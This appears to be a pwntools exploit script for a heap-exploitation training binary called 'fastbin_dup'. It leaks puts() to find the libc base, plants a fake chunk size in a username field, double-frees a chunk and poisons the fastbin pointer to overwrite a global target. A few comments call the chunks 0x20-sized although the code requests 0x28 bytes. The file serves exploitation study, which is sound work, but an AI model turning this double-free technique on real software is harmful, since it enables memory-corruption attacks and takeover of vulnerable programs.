#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup", checksec=True)
libc = elf.libc
context.log_level = "debug"

gs = """
set context-sections code
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()
io.timeout = 1


io.readuntil(b"puts() @ ")
puts_leak = int(io.recvline(), 16)


# The second qword of the "username" field will act as a fake chunk size field.
# we set it to 0x31,  the size of the chunk being duplicated in this solution.
io.sendafter(b"username: ", p64(0)+p64(0x31))
io.recvuntil(b"> ")


log.info(f"puts leak @ {puts_leak:#x}")
libc.address = puts_leak - libc.sym.puts
log.info(f"libc base @ {libc.address:#x}")


def malloc(size, data):
    io.sendafter(b"> ", b"1")
    io.sendafter(b"size: ", str(size).encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")


def free(index):
    io.sendafter(b"> ", b"2")
    io.sendafter(b"index: ", str(index).encode())
    io.recvuntil(b"> ")


# allocate two chunks
malloc(0x28, b"A"*0x28)
malloc(0x28, b"B"*0x28)

# double free
free(0)  # dup chunk
free(1)  # safety chunk
free(0)  # dup chunk  | double free


# The next request for a 0x20-sized chunk will be serviced by the "dup" chunk.
# Request it, then overwrite its fastbin fd, pointing it to the fake chunk in "username".
malloc(0x28, p64(elf.sym.user))
# Make two more requests for 0x20 sized chunks. The "safety" chunk, then the "dup" chunk are allocated to service these requests.
malloc(0x28, b"junk")
malloc(0x28, b"junk")
# The next request for a 0x20 sized chunk is serviced by the fake chunk in "username".
# The first qword of its user data overlaps the target data.
malloc(0x28, b"sub2pwnpope")


io.interactive()
